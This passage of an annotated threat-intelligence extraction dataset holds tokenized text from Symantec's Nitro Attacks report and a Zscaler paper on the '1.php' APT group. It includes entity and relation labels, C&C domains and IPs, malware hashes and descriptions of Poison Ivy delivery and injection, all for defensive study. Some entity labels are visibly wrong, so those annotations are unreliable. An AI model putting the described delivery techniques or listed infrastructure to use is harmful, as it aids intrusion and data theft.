["Older", "attacks", "involved", "a", "self", "-", "extracting", "archive", "with", "a", "suggestive", "name", ",", "for", "example", ":", "\u201c", "Human", "right", "report", "of", "north", "Africa", "under", "the", "war", "."], ["scr", "\u201d", "."], ["The", "most", "recent", "attacks", "focusing", "on", "the", "chemical", "industry", "are", "using", "password", "-", "protected", "7zip", "files", "which", ",", "when", "extracted", ",", "contain", "a", "self", "-", "extracting", "executable", "."], ["The", "password", "to", "extract", "the", "7zip", "file", "is", "included", "in", "the", "email", "."], ["This", "extra", "stage", "is", "used", "to", "prevent", "automated", "systems", "from", "extracting", "the", "self", "-", "extracting", "archive", "."], ["Some", "example", "file", "names", "using", "this", "technique", "include", ":", "\u2022", "\u2022"], ["\u2022", "\u2022", "AntiVirus_update_package.7z", "acquisition.7z"], ["offer.7z", "update_flashplayer10ax.7z", "Page", "4"], ["The", "Nitro", "Attacks", ":", "Stealing", "Secrets", "from", "the", "Chemical", "Industry", "Security", "Response", "An", "example", "of", "an", "email", "used", "to", "send", "the", "attachment", "can", "be", "seen", "in", "figure", "3", "."], ["Figure", "3", "Malicious", "email"], ["The", "email", "is", "quite", "generic", ",", "applicable", "to", "any", "corporate", "user", "."], ["Some", "of", "the", "subject", "lines", "will", "vary", "and", "may", "include", "the", "name", "of", "the", "targeted", "company", "in", "an", "attempt", "to", "be", "more", "convincing", "."], ["Threat", "details"], ["When", "the", "self", "-", "extracting", "archive", "file", "is", "executed", ",", "it", "will", "drop", "two", "files", "."], ["Examples", "of", "file", "names", "that", "are", "used", "include", ":", "\u2022", "%", "Temp%\\happiness.txt"], ["\u2022", "%", "Temp%\\xxxx.exe"], ["The", "executable", "file", ",", "xxxx.exe", "in", "this", "case", ",", "is", "then", "executed", "."], ["The", "second", "file", ",", "happiness.txt", ",", "contains", "custom", "code", "in", "binary", "format", "that", "is", "encrypted", "and", "used", "by", "xxxx.exe", "."], ["The", "xxxx.exe", "file", "copies", "happiness.txt", "to", "C:\\PROGRAM", "FILES\\common", "files\\"], ["ODBC\\ODUBC.DLL", "and", "to", "C:\\WINDOWS\\system32\\jql.sys", "."], ["It", "then", "loads", "the", "contents", "of", "the", "encrypted", "file", "and", "injects", "it", "into", "the", "explorer.exe", "and", "iexplore.exe", "processes", "."], ["The", "injected", "code", "copies", "xxxx.exe", "to", "%", "System%\\winsys.exe", "and", "connects", "to", "the", "Command", "and", "Control", "(", "C&C", ")", "server", "on", "TCP", "port", "80", "."], ["The", "communication", "with", "the", "server", "is", "a", "handshake", "using", "an", "encryption", "algorithm", "(", "Camellia", ")", "."], ["Once", "the", "Trojan", "establishes", "the", "server", "\u2019s", "authenticity", ",", "it", "expects", "a", "variable", "-", "size", "block", "of", "binary", "code", "that", "is", "read", "from", "the", "server", "straight", "into", "the", "virtual", "space", "for", "iexplore.exe", "and", "then", "executed", "."], ["When", "an", "executable", "is", "compiled", ",", "the", "compiler", "will", "store", "some", "metadata", "in", "the", "compiled", "executable", "."], ["One", "particular", "piece", "of", "relevant", "metadata", "is", "the", "location", "of", "the", "compiled", "code", "on", "disk", "."], ["The", "path", "in", "this", "instance", "contained", "Chinese", "characters", "and", "was", ":", "C:\\Documents", "and", "Settings\\Administrator\\\u684c\u9762\\\u65b0\u5efa\u6587\u4ef6\u5939\\\u8bfb\u53d6\u6587\u4ef6\\Release\\\u8bfb\u53d6\u6587\u4ef6.pdb"], ["This", "translates", "to", ":", "C:\\Documents", "and", "Settings\\Administrator\\[Desktop]\\[New", "Folder]\\[read", "the", "file]\\Release\\[read", "the", "file].pdb", "Page", "5"], ["The", "Nitro", "Attacks", ":", "Stealing", "Secrets", "from", "the", "Chemical", "Industry", "Security", "Response", "Command", "and", "Control", "(", "C&C", ")"], ["When", "executed", ",", "the", "Poison", "Ivy", "threat", ",", "or", "Backdoor", ".", "Odivy", ",", "connects", "to", "a", "command", "and", "control", "(", "C&C", ")", "server", "over", "TCP", "port", "80", "."], ["A", "number", "of", "different", "C&C", "domains", "and", "IP", "addresses", "were", "identified", "."], ["The", "domains", "and", "IPs", "are", "listed", "in", "table", "1", "."], ["The", "majority", "of", "samples", "connect", "to", "a", "domain", ";", "however", "one", "subset", "of", "samples", "connected", "directly", "to", "the", "IP", "address", "204.74.215.58", ",", "which", "belonged", "to", "the", "Chinese", "QQ", "user", "mentioned", "previously", "and", "was", "also", "associated", "with", "antivirus-groups.com", "."], ["Related", "Attacks", "Table", "1", "C&C", "domains", "and", "IPs"], ["Domain", "IPs", "pr[REMOVED].noip.org", "173.252.207.71", ",", "173.252.205.36", ",", "173.252.205.37", ",", "173.252.205.64", "antivirus-groups.com", "74.82.166.205", ",", "204.74.215.58", "domain.rm6.org", "216.131.95.22", ",", "222.255.28.27"], ["Several", "other", "hacker", "groups", "have", "also"], ["anti-virus.sytes.net", "173.252.205.36", ",", "173.252.205.37", ",", "173.252.205.64", "begun", "targeting", "some", "of", "the", "same", "chemical", "companies", "in", "this", "time", "period", "."], ["Attackers", "are", "sending", "malicious", "PDF", "and", "DOC", "files", ",", "which", "use", "exploits", "to", "drop", "variants", "of", "Backdoor", ".", "Sogu", "."], ["This", "particular", "threat", "was", "also", "used", "by", "hackers", "to", "compromise", "a", "Korean", "social", "network", "site", "to", "steal", "records", "of", "35", "million", "users", "."], ["Determining", "if", "the", "two", "groups", "are", "related", "is", "difficult", ",", "but", "any", "relationship", "appears", "unlikely", "."], ["The", "attackers", "described", "in", "this", "document", "use", "a", "very", "basic", "delivery", "platform", ";", "compressed", "self", "-", "extracting", "archives", "sometimes", "sent", "to", "a", "large", "number", "of", "recipients", "."], ["The", "Sogu", "gang", ",", "in", "contrast", ",", "use", "PDF", "and", "DOC", "files", "in", "very", "tailored", ",", "targeted", "emails", "."], ["The", "Sogu", "gang", "use", "a", "custom", "developed", "threat", "\u2013", "Backdoor", "."], ["Sogu", ",", "whereas", "the", "group", "described", "in", "this", "document", "use", "an", "off", "the", "shelf", "threat", "\u2013", "Poison", "Ivy", "."], ["While", "the", "number", "of", "Sogu", "targets", "is", "currently", "small", "relative", "to", "the", "Poison", "Ivy", "attacks", ",", "we", "continue", "to", "monitor", "their", "activities", "."], ["Summary"], ["Numerous", "targeted", "attack", "campaigns", "are", "occurring", "every", "week", "."], ["However", ",", "relative", "to", "the", "total", "number", "of", "attacks", ",", "few", "are", "fully", "disclosed", "."], ["These", "attacks", "are", "primarily", "targeting", "private", "industry", "in", "search", "of", "key", "intellectual", "property", "for", "competitive", "advantage", ",", "military", "institutions", ",", "and", "governmental", "organizations", "often", "in", "search", "of", "documents", "related", "to", "current", "political", "events", "and", "human", "rights", "organizations", "."], ["This", "attack", "campaign", "focused", "on", "the", "chemical", "sector", "with", "the", "goal", "of", "obtaining", "sensitive", "documents", "such", "as", "proprietary", "designs", ",", "formulas", ",", "and", "manufacturing", "processes", "."], ["Page", "6", "Security", "Response", "The", "Nitro", "Attacks", ":"], ["Stealing", "Secrets", "from", "the", "Chemical", "Industry", "Appendix"], ["Example", "MD5s", "of", "PoisonIvy", "samples", "used", "in", "these", "attacks", ":", "\u2022"], ["\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022", "\u2022"], ["\u2022", "\u2022", "091457444b7e7899c242c5125ddc0571"], ["6e99585c3fbd4f3a55bd8f604cb35f38", "07e266f7fb3c36a1f3a5c5d2d229a478"], ["17e7022496d8092d3ca76ae9524a7260"], ["2f37912e7cb6e5c478e6dc3d0e381a24"], ["5d075e9536c5494745135c1176981c96"], ["76000c77ea9a214f5b2ae8cc387809db"], ["a98d2c90b9494fc885c7cd35d43666ea", "c128c40bd8acb282288e8138352ce4e1", "cab66da82594ff5266ac8dd89e3d1539", "70fcb3446fce23b18d9a12b2ed911e52", "c53c93a445d751387eb167e5a2b901da", "dd5715cb3b0cdddbe131f03cc08f0f57", "0f54a9757f1a2fef2b04b776714a7546", "37f70717f549f1938e5785527e56978d", "31346e5b39ddb095d76071ac86da4c2e"], ["330ddac1f605ff8abf60880c584ed797"], ["457a2a8d0784e9fc8e49f6ef60f7f29e"], ["87aeec7f7c4ec1b6dc5e6c39b28d8273", "8d36fd85d9c7d1f4bb170a28cc23498a"], ["de7e293aa9c4d849dc080f3e87573b24", "64a4ad90a55e7b6c30c46135435f50a2", "Page", "7", "Security", "Response"], ["Any", "technical", "information", "that", "is", "made", "available", "by", "Symantec", "Corporation", "is", "the", "copyrighted", "work", "of", "Symantec", "Corporation", "and", "is", "owned", "by", "Symantec", "Corporation", "."], ["NO", "WARRANTY", "."], ["The", "technical", "information", "is", "being", "delivered", "to", "you", "as", "is", "and", "Symantec", "Corporation", "makes", "no", "warranty", "as", "to", "its", "accuracy", "or", "use", "."], ["Any", "use", "of", "the", "technical", "documentation", "or", "the", "information", "contained", "herein", "is", "at", "the", "risk", "of", "the", "user", "."], ["Documentation", "may", "include", "technical", "or", "other", "inaccuracies", "or", "typographical", "errors", "."], ["Symantec", "reserves", "the", "right", "to", "make", "changes", "without", "prior", "notice", "."], ["About", "the", "authors"], ["Eric", "Chien", "is", "a", "Technical", "Director", "for", "Security", "Response", "and", "Gavin", "O\u2019Gorman", "is", "a", "Security", "Response", "Manager", "in", "Symantec", "."], ["For", "specific", "country", "offices", "and", "contact", "numbers", ",", "please", "visit", "our", "Web", "site", "."], ["For", "product", "information", "in", "the", "U.S.", ",", "call", "toll", "-", "free", "1", "(", "800", ")", "745", "6054", "."], ["Symantec", "Corporation", "World", "Headquarters", "350", "Ellis", "Street", "Mountain", "View", ",", "CA", "94043"], ["USA"], ["+1", "(", "650", ")", "527", "-", "8000", "www.symantec.com", "About", "Symantec", "Symantec", "is", "a", "global", "leader", "in", "providing", "security", ",", "storage", "and", "systems", "management", "solutions", "to", "help", "businesses", "and", "consumers", "secure", "and", "manage", "their", "information", "."], ["Headquartered", "in", "Moutain", "View", ",", "Calif.", ",", "Symantec", "has", "operations", "in", "more", "than", "40", "countries", "."], ["More", "information", "is", "available", "at", "www.symantec.com", "."], ["Copyright", "\u00a9", "2011", "Symantec", "Corporation", "."], ["All", "rights", "reserved", "."], ["Symantec", "and", "the", "Symantec", "logo", "are", "trademarks", "or", "registered", "trademarks", "of", "Symantec", "Corporation", "or", "its", "affiliates", "in", "the", "U.S.", "and", "other", "countries", "."], ["Other", "names", "may", "be", "trademarks", "of", "their", "respective", "owners", "."]]}, {"vertexSet": [[{"name": "1.php", "pos": [23, 24], "sent_id": 4, "type": "AttackerGroup"}], [{"name": "spear-phishing emails", "pos": [7, 11], "sent_id": 5, "type": "Exploit"}], [{"name": "malicious PDF attachments", "pos": [12, 15], "sent_id": 5, "type": "Exploit"}], [{"name": "web links to binary executables", "pos": [16, 21], "sent_id": 5, "type": "Exploit"}], [{"name": "Poison Ivy", "pos": [23, 25], "sent_id": 5, "type": "Malware"}], [{"name": "China", "pos": [6, 7], "sent_id": 6, "type": "Country"}], [{"name": "US", "pos": [8, 9], "sent_id": 6, "type": "Country"}], [{"name": "Defense entities", "pos": [12, 14], "sent_id": 6, "type": "ExploitTargetObject"}], [{"name": "Geospatial industry", "pos": [17, 19], "sent_id": 6, "type": "ExploitTargetObject"}], [{"name": "Zscaler", "pos": [0, 1], "sent_id": 7, "type": "Organization"}], [{"name": "Zscaler", "pos": [11, 12], "sent_id": 19, "type": "Organization"}], [{"name": "ThreatlabZ", "pos": [12, 13], "sent_id": 19, "type": "Software"}], [{"name": "1.php", "pos": [14, 15], "sent_id": 58, "type": "Attacker"}], [{"name": "2009", "pos": [11, 12], "sent_id": 59, "type": "Time"}], [{"name": "WWW.DREAMLIFES.NET/Afghanistan/Afghanistan.zip", "pos": [3, 8], "sent_id": 63, "type": "File"}], [{"name": "052E62513505A25CCFADF900A052709C", "pos": [0, 1], "sent_id": 65, "type": "MD5"}], [{"name": "Poison Ivy RAT", "pos": [18, 21], "sent_id": 66, "type": "Malware"}], [{"name": "CVE-2009-4324", "pos": [18, 21], "sent_id": 68, "type": "Vulnerability"}], [{"name": "Poison Ivy RAT", "pos": [19, 22], "sent_id": 72, "type": "Malware"}], [{"name": "SUCHOST.EXE", "pos": [3, 4], "sent_id": 73, "type": "File"}], [{"name": "Request.pdf", "pos": [6, 7], "sent_id": 73, "type": "File"}], [{"name": "B0EECA383A7477EE689EC807B775EBBB", "pos": [0, 1], "sent_id": 75, "type": "MD5"}], [{"name": "1.php", "pos": [6, 7], "sent_id": 80, "type": "Attacker"}], [{"name": "CECON.FLOWER-SHOW.ORG", "pos": [6, 9], "sent_id": 81, "type": "Indicator"}], [{"name": "July 2011", "pos": [4, 6], "sent_id": 82, "type": "Time"}], [{"name": "CVE-2010-2883", "pos": [6, 9], "sent_id": 83, "type": "Vulnerability"}], [{"name": "Japan", "pos": [19, 20], "sent_id": 83, "type": "Country"}], [{"name": "China", "pos": [21, 22], "sent_id": 83, "type": "Country"}], [{"name": "Taiwan", "pos": [23, 24], "sent_id": 83, "type": "Country"}], [{"name": "USA", "pos": [25, 26], "sent_id": 83, "type": "Country"}], [{"name": "CVE-2010-2883", "pos": [17, 20], "sent_id": 84, "type": "Vulnerability"}], [{"name": "CVE-2010-2883", "pos": [9, 12], "sent_id": 85, "type": "Vulnerability"}], [{"name": "Poison Ivy", "pos": [14, 16], "sent_id": 85, "type": "Malware"}], [{"name": "Halloween.scr", "pos": [19, 20], "sent_id": 86, "type": "File"}], [{"name": "5B90896127179F0AD2E6628593CDB60D", "pos": [2, 3], "sent_id": 87, "type": "MD5"}], [{"name": "FREE.COFFEELAUCH.COM", "pos": [15, 16], "sent_id": 91, "type": "Indicator"}], [{"name": "98.126.69.3", "pos": [17, 18], "sent_id": 91, "type": "Address"}], [{"name": "FIREHAPPY.SYTES.NET", "pos": [20, 21], "sent_id": 91, "type": "Indicator"}], [{"name": "98.126.69.3", "pos": [23, 24], "sent_id": 91, "type": "Address"}], [{"name": "base64 encoded", "pos": [33, 35], "sent_id": 93, "type": "MalwareCharacteristics"}], [{"name": "0x3C", "pos": [3, 4], "sent_id": 94, "type": "MalwareCharacteristics"}], [{"name": "0x3E", "pos": [5, 6], "sent_id": 94, "type": "MalwareCharacteristics"}], [{"name": "Win32.Buzus.cvdu7", "pos": [0, 1], "sent_id": 101, "type": "TrojanHorse"}], [{"name": "Trojan.Win32.Agent. eevf8", "pos": [7, 12], "sent_id": 101, "type": "TrojanHorse"}], [{"name": "FQDN/css.ashx?sc=[data1]&sp=[data2]&ad=[data3]&dh=[data4]&mr=[d ata5]&tk=", "pos": [32, 36], "sent_id": 119, "type": "Indicator"}], [{"name": "HOUSE.SUPERDOGDREAM.COM", "pos": [2, 3], "sent_id": 123, "type": "Indicator"}], [{"name": "HOME.ALLMYDEARFRIENDS.COM", "pos": [0, 1], "sent_id": 124, "type": "Indicator"}], [{"name": "GOOGLETIME.SERVEIRC.COM", "pos": [0, 1], "sent_id": 125, "type": "Indicator"}], [{"name": "INFO.SPORTGAMEINFO.COM", "pos": [0, 1], "sent_id": 127, "type": "Indicator"}], [{"name": "PEOPLE.ENJOYHOLIDAYS.NET", "pos": [0, 1], "sent_id": 128, "type": "Indicator"}], [{"name": "PEARHOST.SERVEHALFLIFE.COM", "pos": [0, 1], "sent_id": 129, "type": "Indicator"}], [{"name": "1.php", "pos": [6, 7], "sent_id": 134, "type": "AttackerGroup"}], [{"name": "FQDN/[data1]/[data2]/[data3]/[data4]/[data5]", "pos": [37, 39], "sent_id": 134, "type": "Indicator"}], [{"name": "SATELLITE.QUICKSEARCHMOVIE.COM", "pos": [0, 1], "sent_id": 140, "type": "Indicator"}], [{"name": "WWW.TOYHOPING.COM", "pos": [0, 1], "sent_id": 141, "type": "Indicator"}], [{"name": "WORK.FREETHROWLINE.NET", "pos": [0, 1], "sent_id": 142, "type": "Indicator"}], [{"name": "SEA.ANIMALFANS.NET", "pos": [1, 2], "sent_id": 142, "type": "Indicator"}], [{"name": "WWW.SEARCHSEA.NET", "pos": [2, 3], "sent_id": 142, "type": "Indicator"}], [{"name": "LOVE.ANIMALFANS.NET", "pos": [0, 1], "sent_id": 143, "type": "Indicator"}], [{"name": "WWW.JOBCALL.ORG", "pos": [1, 2], "sent_id": 143, "type": "Indicator"}], [{"name": "1.php", "pos": [27, 28], "sent_id": 143, "type": "Attacker"}], [{"name": "August 3, 2011", "pos": [13, 17], "sent_id": 145, "type": "Time"}], [{"name": "WWW.SAVAGECOUNTY.NET", "pos": [2, 3], "sent_id": 155, "type": "Indicator"}], [{"name": "LOOK.CAPTAINSABERTOOTH.NET", "pos": [0, 1], "sent_id": 156, "type": "Indicator"}], [{"name": "GEOINFO.SERVEHTTP.COM", "pos": [1, 2], "sent_id": 156, "type": "Indicator"}], [{"name": "ROSE.OFFICESKYLINE.COM", "pos": [0, 1], "sent_id": 157, "type": "Indicator"}], [{"name": "WWW.CAREERCHALLENGES.NET", "pos": [1, 2], "sent_id": 157, "type": "Indicator"}], [{"name": "OFFER.AMERICAMS.N", "pos": [2, 3], "sent_id": 157, "type": "Indicator"}], [{"name": "firehappy.sytes.net", "pos": [1, 2], "sent_id": 168, "type": "Indicator"}], [{"name": "free", "pos": [2, 3], "sent_id": 169, "type": "Host"}], [{"name": "image", "pos": [3, 4], "sent_id": 169, "type": "Host"}], [{"name": "98.126.69.3", "pos": [4, 5], "sent_id": 169, "type": "Address"}], [{"name": "dreamlifes.net", "pos": [5, 6], "sent_id": 169, "type": "Indicator"}], [{"name": "tastfine", "pos": [6, 7], "sent_id": 169, "type": "Host"}], [{"name": "seablow.net", "pos": [4, 5], "sent_id": 171, "type": "Indicator"}], [{"name": "superdogdream.com", "pos": [5, 6], "sent_id": 171, "type": "Indicator"}], [{"name": "house", "pos": [6, 7], "sent_id": 171, "type": "Host"}], [{"name": "allmydearfriends.com", "pos": [7, 8], "sent_id": 171, "type": "Indicator"}], [{"name": "do:", "pos": [8, 10], "sent_id": 171, "type": "Host"}], [{"name": "sportgameinfo.com", "pos": [12, 13], "sent_id": 171, "type": "Indicator"}], [{"name": "enjoyholidays.net", "pos": [13, 14], "sent_id": 171, "type": "Indicator"}], [{"name": "jobcall.org", "pos": [16, 17], "sent_id": 171, "type": "Indicator"}], [{"name": "geoinfo.servehttp.com", "pos": [17, 18], "sent_id": 171, "type": "Indicator"}], [{"name": "dream", "pos": [18, 19], "sent_id": 171, "type": "Host"}], [{"name": "smart", "pos": [19, 20], "sent_id": 171, "type": "Host"}], [{"name": "178.63.130.197", "pos": [20, 21], "sent_id": 171, "type": "Address"}], [{"name": "rose", "pos": [21, 22], "sent_id": 171, "type": "Host"}], [{"name": "46.4.209.130", "pos": [24, 25], "sent_id": 171, "type": "Address"}], [{"name": "officeskyline.com", "pos": [0, 1], "sent_id": 172, "type": "Indicator"}], [{"name": "qinetiq", "pos": [1, 2], "sent_id": 172, "type": "Host"}], [{"name": "captainsabertooth.net", "pos": [2, 3], "sent_id": 172, "type": "Indicator"}], [{"name": "qnao", "pos": [3, 4], "sent_id": 172, "type": "Host"}], [{"name": "savagecounty.net", "pos": [4, 5], "sent_id": 172, "type": "Indicator"}], [{"name": "look", "pos": [10, 11], "sent_id": 172, "type": "Host"}], [{"name": "www", "pos": [0, 1], "sent_id": 174, "type": "Host"}], [{"name": "bakerhughes.thruthere.net9", "pos": [4, 5], "sent_id": 176, "type": "Indicator"}], [{"name": "1.php", "pos": [11, 12], "sent_id": 177, "type": "Attacker"}], [{"name": "US Government", "pos": [7, 9], "sent_id": 178, "type": "ExploitTargetObject"}], [{"name": "Defense Industrial Base", "pos": [13, 16], "sent_id": 178, "type": "ExploitTargetObject"}], [{"name": "Soysauce", "pos": [27, 28], "sent_id": 184, "type": "AttackerGroup"}], [{"name": "Comment Crew", "pos": [7, 9], "sent_id": 185, "type": "AttackerGroup"}], [{"name": "GIF89a", "pos": [17, 18], "sent_id": 185, "type": "AttackerGroup"}], [{"name": "steganography", "pos": [41, 42], "sent_id": 187, "type": "Exploit"}], [{"name": "Microsoft", "pos": [19, 20], "sent_id": 208, "type": "Organization"}], [{"name": "IE 6", "pos": [20, 22], "sent_id": 208, "type": "Software"}]], "labels": [{"r": "P3", "h": 4, "t": 0, "evidence": [4, 5]}, {"r": "P32", "h": 4, "t": 5, "evidence": [5, 6]}, {"r": "P32", "h": 4, "t": 6, "evidence": [5, 6]}, {"r": "P17", "h": 10, "t": 11, "evidence": [19]}, {"r": "P33", "h": 12, "t": 13, "evidence": [58, 59]}, {"r": "P21", "h": 14, "t": 16, "evidence": [63, 66]}, {"r": "P21", "h": 15, "t": 16, "evidence": [65, 66]}, {"r": "P7", "h": 16, "t": 17, "evidence": [66, 68]}, {"r": "P21", "h": 19, "t": 18, "evidence": [72, 73]}, {"r": "P21", "h": 21, "t": 18, "evidence": [72, 75]}, {"r": "P21", "h": 20, "t": 18, "evidence": [72, 73]}, {"r": "P33", "h": 22, "t": 24, "evidence": [80, 82]}, {"r": "P21", "h": 23, "t": 18, "evidence": [72, 81]}, {"r": "P32", "h": 22, "t": 26, "evidence": [80, 83]}, {"r": "P32", "h": 22, "t": 27, "evidence": [80, 83]}, {"r": "P32", "h": 22, "t": 28, "evidence": [80, 83]}, {"r": "P32", "h": 22, "t": 29, "evidence": [80, 83]}, {"r": "P7", "h": 32, "t": 25, "evidence": [83, 85]}, {"r": "P7", "h": 32, "t": 31, "evidence": [85]}, {"r": "P7", "h": 32, "t": 30, "evidence": [84, 85]}, {"r": "P21", "h": 33, "t": 32, "evidence": [85, 86]}, {"r": "P21", "h": 34, "t": 32, "evidence": [85, 87]}, {"r": "P33", "h": 60, "t": 61, "evidence": [143, 145]}, {"r": "P17", "h": 103, "t": 104, "evidence": [208]}], "title": "201110Zscaler1php", "sents": [["Alleged", "APT", "Intrusion", "Set", ":", "\u201c", "1.php", "\u201d", "Group", "Whitepaper", ":"], ["Alleged", "APT", "Intrusion", "Set", ":", "\u201c", "1.php", "\u201d", "Group", "\u00a9", "2011", "Zscaler", "."], ["All", "Rights", "Reserved", "."], ["Page", "1"], ["Alleged", "APT", "Intrusion", "Set", ":", "\u201c", "1.php", "\u201d", "Group", "The", "following", "release", "statement", "provides", "a", "brief", "summary", "of", "information", "related", "to", "the", "\u201c", "1.php", "\u201d", "Group", "dating", "from", "2008", "to", "present", "."], ["This", "Group", "\u2019s", "methods", "tend", "to", "be", "spear", "-", "phishing", "emails", "with", "malicious", "PDF", "attachments", "or", "web", "links", "to", "binary", "executables", "with", "a", "Poison", "Ivy", "remote", "administration", "tool", "(", "RAT", ")", "payload", "."], ["The", "Group", "\u2019s", "targeted", "victims", "included", "China", "/", "US", "relations", "experts", ",", "Defense", "entities", ",", "and", "the", "Geospatial", "industry", "."], ["Zscaler", "detected", "repeated", "infections", "from", "this", "Group", "to", "a", "customer", "related", "to", "this", "target", "list", "."], ["The", "following", "report", "summarizes", "the", "incident", "details", "to", "\u201c", "This", "Group", "\u2019s", "methods", "tend", "to", "be", "spear", "-", "phishing", "emails", "with", "malicious", "PDF", "attachments", "or", "web", "links", "to", "binary", "executables", "with", "a", "(", "RAT", ")", "payload", "."], ["\u201c", "Summary", "increase", "awareness", "of", "these", "attacks", "in", "order", "to", "increase", "detection", ",", "-Zscaler", "ThreatLabZ", "response", ",", "and", "prevention", "."], ["A", "much", "more", "detailed", "report", "has", "been", "provided", "to", "impacted", "parties", ",", "stakeholders", ",", "and", "other", "trusted", "groups", "dealing", "with", "these", "incidents", "."], ["The", "larger", "report", "dives", "into", "more", "details", "about", "the", "command", "and", "control", "servers", "(", "C&Cs", ")", "would", "like", "to", "collaborate", ",", "please", "contact"], ["threatlabz@zscaler.com"], ["and", "we", "will", "share", "the", "detailed", "report", "with", "select", "entities", "."], ["Introduction"], ["Zscaler", "provides", "inline", "security", "and", "policy", "enforcement", "of", "web", "and", "email", "transactions", "to", "include", "full", "-", "content", "inspection", "and", "comprehensive", "transaction", "logging", "and", "analysis", "."], ["Given", "that", "many", "of", "Zscaler", "\u2019s", "customers", "are", "large", "enterprises", ",", "it", "is", "not", "surprising", "that", "some", "have", "been", "the", "target", "of", "so", "called", "Advanced", "\u201c", "The", "Group", "\u2019s", "targeted", "victims", "included", "China", "/", "US", "relations", "experts", ",", "Defense", "entities", ",", "and", "the", "Geospatial", "industry", "."], ["\u201c", "being", "used", "by", "this", "Group", "."], ["If", "you", "are", "working", "on", "similar", "research", "-Zscaler", "ThreatLabZ", "Persistent", "Threats", "(", "APTs", ")", "."], ["During", "the", "course", "of", "our", "daily", "activities", "researching", "various", "threats", ",", "Zscaler", "ThreatlabZ", "often", "uncovers", "infected", "hosts", "that", "we", "believe", "have", "been", "compromised", "via", "attacks", "that", "bear", "the", "signature", "of", "an", "APT", "attack", "."], ["While", "there", "is", "no", "universally", "accepted", "definition", "of", "APT", "attacks", ",", "for", "the", "purposes", "of", "this", "paper", "we", "will", "leverage", "Richard", "Bejtlich", "\u2019s", "blog", "post", "on", "the", "subject1", "."], ["1", "."], ["http://taosecurity.blogspot.com/2010/01/what-is-apt-and-what-does-it-want.html", "\u00a9", "2011", "Zscaler", "."], ["All", "Rights", "Reserved", "."], ["Page", "2"], ["Alleged", "APT", "Intrusion", "Set", ":", "\u201c", "1.php", "\u201d", "Group", "of", "computer", "intrusion", "."], ["They", "can", "use", "the", "most", "pedestrian", "publicly", "available", "exploit", "against", "a", "well", "-", "known", "vulnerability", ",", "or", "they", "can", "elevate", "their", "game", "to", "research", "new", "vulnerabilities", "and", "develop", "custom", "exploits", ",", "depending", "on", "the", "target", "\u2019s", "posture", "."], ["\u2022"], ["Persistent", "means", "the", "adversary", "is", "formally", "tasked", "to", "accomplish", "a", "mission", "."], ["They", "are", "not", "opportunistic", "intruders", "."], ["Like", "an", "intelligence", "unit", "they", "receive", "directives", "and", "work", "to", "satisfy", "their", "masters", "."], ["Persistent", "does", "not", "necessarily", "mean", "they", "need", "to", "constantly", "execute", "malicious", "code", "on", "victim", "computers", "."], ["Rather", ",", "they", "maintain", "the", "level", "of", "interaction", "needed", "to", "execute", "their", "objectives", "."], ["\u2022"], ["Threat", "means", "the", "adversary", "is", "not", "a", "piece", "of", "mindless", "code", "."], ["This", "point", "is", "crucial", "."], ["Some", "people", "throw", "around", "the", "term", "\u201c", "threat", "\u201d", "with", "reference", "to", "malware", "."], ["If", "malware", "had", "no", "human", "\u201c", "\u2026", "the", "adversary", "here", "is", "a", "threat", "because", "it", "is", "organized", "and", "funded", "and", "motivated", "."], ["Some", "people", "speak", "of", "multiple", "\u201c", "groups", "\u201d", "consisting", "of", "dedicated", "\u201c", "crews", "\u201d", "with", "various", "missions", "."], ["\u201c", "\u2022", "Advanced", "means", "the", "adversary", "can", "operate", "in", "the", "full", "spectrum", "-Richard"], ["Bejtlich", ",", "TaoSecurity", "blog", "attached", "to", "it", "(", "someone", "to", "control", "the", "victim", ",", "read", "the", "stolen", "data", ",", "etc", ".", ")", ",", "then", "most", "malware", "would", "be", "of", "little", "worry", "(", "as", "long", "as", "it", "did", "n\u2019t", "degrade", "or", "deny", "data", ")", "."], ["Rather", ",", "the", "adversary", "here", "is", "a", "threat", "because", "it", "is", "organized", "and", "funded", "and", "motivated", "."], ["Some", "people", "speak", "of", "multiple", "\u201c", "groups", "\u201d", "consisting", "of", "dedicated", "\u201c", "crews", "\u201d", "with", "various", "missions", "."], ["\u00a9", "2011", "Zscaler", "."], ["All", "Rights", "Reserved", "."], ["Page", "3"], ["Alleged", "APT", "Intrusion", "Set", ":", "\u201c", "1.php", "\u201d", "Group", "Contents"], ["Summary", ".......................................................................................................................", "1", "Introduction", "....................................................................................................................", "1", "Section", "1", ":", "\u201c", "1.php", "\u201d", "Group", "Open", "-", "Source", "Intelligence", "(", "OSINT", ")", ".........................................."], ["5", "Section", "2", ":", "Customer", "Infection", "Behavior", ".........................................................................", "8", "2.1", "GET", "Beacons", "with", "Modified", "XOR", "Parameters", ".........................................................", "8", "2.2", "GET", "Beacons", "with", "Data", "moved", "to", "URL", "path", "............................................................"], ["9", "2.3", "HTTPS", "CONNECTs", "to", "C&Cs", "...................................................................................."], ["9", "Section", "3", ":", "Indent", "Inter", "-", "Relationships", ".............................................................................", "10", "3.1", "Possible", "Relationship", "to", "Other", "APT", "Incidents", "..........................................................", "12", "Section", "4", ":", "Lessons", "Learned", "...........................................................................................", "13", "4.1", "Conduct", "logging", "and", "analytics", "within", "your", "environment", "..........................................", "13", "4.2", "Correlate", "with", "other", "sources", "..................................................................................."], ["14", "4.3", "APTs", "are", "not", "always", "that", "\u2018", "Advanced", "........................................................................", "14", "4.4", "APTs", "are", "not", "limited", "to", "the", "United", "States", "Government", "or", "Defense", "Industrial", "Base", "...."], ["14", "4.5", "APT", "Information", "Disclosure", "Remains", "a", "Challenge", "...................................................", "15", "Conclusion", "....................................................................................................................."], ["16"], ["\u00a9", "2011", "Zscaler", "."], ["All", "Rights", "Reserved", "."], ["Page", "4"], ["Alleged", "APT", "Intrusion", "Set", ":", "\u201c", "1.php", "\u201d", "Group", "\u201c", "1.php", "\u201d", "Group", "Open", "-", "Source", "Intelligence", "(", "OSINT", ")"], ["There", "is", "a", "good", "deal", "of", "information", "in", "the", "public", "domain", "related", "to", "\u201c", "1.php", "\u201d", "Group", "incidents", "(", "malware", "and", "C&Cs", ")", "that", "can", "be", "correlated", "with", "incident", "activity", "that", "we", "identify", "and", "detail", "within", "this", "report", "."], ["Intrusion", "activities", "related", "to", "this", "Group", "date", "back", "at", "least", "to", "2009", ",", "if", "not", "earlier"], ["(", "there", "is", "one", "sample", "we", "found", "dating", "back", "to", "2008", ")", "."], ["For", "example", ",", "a", "December", "7", ",", "2009", "blog", "post", "by", "Contagio2", "details", "a", 